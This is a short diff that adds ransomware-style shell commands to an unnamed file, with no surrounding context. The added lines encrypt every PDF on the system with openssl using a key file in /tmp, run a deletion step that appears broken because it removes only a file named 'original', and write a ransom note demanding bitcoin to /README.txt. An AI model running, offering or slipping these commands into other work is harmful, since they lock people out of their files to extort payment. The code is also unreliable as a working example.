@@ -1,0 +1,4 @@
+find / -type f -name "*.pdf" -exec openssl enc -aes-256-cbc -salt -in {} -out {}.locked -pass file:/tmp/k \;
+rm -f original
+echo "your files are encrypted, pay bitcoin" > /README.txt
+
